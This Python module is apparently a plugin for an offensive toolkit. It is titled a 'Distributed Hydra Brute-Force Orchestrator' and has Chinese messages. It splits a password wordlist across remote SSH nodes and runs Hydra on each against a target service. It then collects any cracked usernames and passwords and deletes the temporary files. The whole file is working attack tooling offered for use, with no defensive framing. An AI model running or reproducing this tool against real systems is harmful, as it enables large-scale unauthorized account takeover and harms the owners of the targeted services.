import os
import sys
lib_path = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), "lib")
sys.path.insert(0, lib_path)

import json
import re
import tempfile
import threading
import fcntl
import paramiko

def safe_print(msg):
    with open(sys.stdout.fileno(), 'wb', closefd=False) as fd:
        fcntl.flock(fd, fcntl.LOCK_EX)
        sys.stdout.write(msg + '\n')
        sys.stdout.flush()
        fcntl.flock(fd, fcntl.LOCK_UN)


if sys.platform == "win32":
    kernel32 = ctypes.windll.kernel32
    handle = kernel32.GetStdHandle(-11)
    mode = ctypes.c_ulong()
    kernel32.GetConsoleMode(handle, ctypes.byref(mode))
    mode.value |= 0x0004
    kernel32.SetConsoleMode(handle, mode)


class Module:
    def __init__(self):
        self.name = "Distributed Hydra Brute-Force Orchestrator"
        self.port = None
        self.protocol = "tcp"
        self.platform = "multi"
        self.use_msf = False

    def exploit(self, target_ip=None, target_port=None, service="ssh", user="root", lhost=None):
        config_path = os.path.join(os.path.dirname(__file__), "..", "..", "nodes.json")
        if not os.path.exists(config_path):
            return False, "nodes.json 配置文件不存在"
        with open(config_path, "r") as f:
            config = json.load(f)

        nodes = config.get("nodes", [])
        if not nodes:
            return False, "没有可用的分布式节点（nodes.json 中 nodes 为空）"

        wordlist_path = config.get("wordlist_local", "")
        if not wordlist_path:
            return False, "nodes.json 缺少 wordlist_local 字段"
        if not os.path.isabs(wordlist_path):
            root = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
            for base in (root, os.path.dirname(__file__)):
                candidate = os.path.join(base, wordlist_path)
                if os.path.exists(candidate):
                    wordlist_path = candidate
                    break
        if not os.path.exists(wordlist_path):
            return False, f"字典文件不存在: {wordlist_path}（检查 nodes.json 的 wordlist_local）"

        user_is_file = bool(isinstance(user, str) and os.path.isfile(user))

        with open(wordlist_path, "r", encoding="latin-1") as f:
            words = f.readlines()
        if not words:
            return False, f"密码字典为空: {wordlist_path}"

        n = len(nodes)
        chunk_size = max(1, -(-len(words) // n))
        chunks = [words[i:i + chunk_size] for i in range(0, len(words), chunk_size)]

        while len(chunks) < n:
            chunks.append([])
        if len(chunks) > n:
            tail = chunks[n - 1:]
            chunks = chunks[:n - 1]
            merged = []
            for c in tail:
                merged.extend(c)
            chunks[-1].extend(merged)

        results = []
        threads = []
        for idx, node in enumerate(nodes):
            if idx >= len(chunks) or not chunks[idx]:
                continue

            hydra_bin = node.get("hydra_path")
            if not hydra_bin:
                print(f"\033[31m[-] 节点 {node['ip']}: nodes.json 缺少 hydra_path，跳过\033[0m")
                continue

            t = threading.Thread(
                target=self._node_worker,
                args=(node, hydra_bin, chunks[idx], target_ip, target_port,
                      service, user, user_is_file, results),
            )
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        for res in results:
            if res.get("success"):
                return True, (
                    f"密码爆破成功！用户名: {res.get('username', user)} "
                    f"密码: {res['password']}（节点 {res.get('node', '?')}）"
                )
        if not results:
            return False, "所有节点均执行失败"
        return False, "分布式爆破未找到有效密码"

    def _node_worker(self, node, hydra_bin, word_chunk, target_ip, port, service,
                     user, user_is_file, results):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        local_chunk = None
        try:
            ssh.connect(node["ip"], username=node["user"],
                        password=node["pass"], timeout=10)

            tag = node["ip"].replace(".", "_")
            sftp = ssh.open_sftp()

            with tempfile.NamedTemporaryFile(
                mode="w", suffix=".txt", delete=False, encoding="latin-1"
            ) as f:
                f.writelines(word_chunk)
                local_chunk = f.name
            remote_chunk = f"/tmp/hydra_pass_{tag}.txt"
            sftp.put(local_chunk, remote_chunk)

            if user_is_file:
                remote_userlist = f"/tmp/hydra_users_{tag}.txt"
                sftp.put(user, remote_userlist)
                login_flag = f'-L "{remote_userlist}"'
                cleanup_userlist = remote_userlist
            else:
                login_flag = f'-l "{user}"'
                cleanup_userlist = ""

            sftp.close()

            remote_result = f"/tmp/hydra_result_{tag}.txt"
            cmd = (
                f'"{hydra_bin}" {login_flag} -P "{remote_chunk}" '
                f'-s {port} {service}://{target_ip} '
                f'-o "{remote_result}" -f -t 4 -I'
            )
            safe_print(f"[*] 节点 {node['ip']} 执行: {cmd}")

            stdin, stdout, stderr = ssh.exec_command(cmd)
            exit_status = stdout.channel.recv_exit_status()

            if exit_status != 0:
                err = stderr.read().decode(errors="ignore").strip()
                print(f"\033[31m[-] 节点 {node['ip']}: hydra rc={exit_status}, {err[:200]}\033[0m")

            sftp = ssh.open_sftp()
            try:
                with sftp.open(remote_result, "rb") as rf:
                    output = rf.read().decode(errors="ignore")
                for m in re.finditer(r"login:\s*(\S+)\s+password:\s*(\S+)", output):
                    results.append({
                        "success": True,
                        "username": m.group(1),
                        "password": m.group(2),
                        "node": node["ip"],
                    })
            except IOError:
                pass
            except Exception as e:
                print(f"\033[31m[-] 节点 {node['ip']} 读取结果失败: {e}\033[0m")
            finally:
                sftp.close()

            rm_list = f'"{remote_chunk}" "{remote_result}"'
            if cleanup_userlist:
                rm_list += f' "{cleanup_userlist}"'
            stdin, stdout, stderr = ssh.exec_command(f"rm -f {rm_list}")
            stdout.channel.recv_exit_status()

        except Exception as e:
            print(f"\033[31m[-] 节点 {node['ip']} 执行失败: {e}\033[0m")
        finally:
            try:
                ssh.close()
            except Exception:
                pass
            if local_chunk and os.path.exists(local_chunk):
                try:
                    os.unlink(local_chunk)
                except Exception:
                    pass
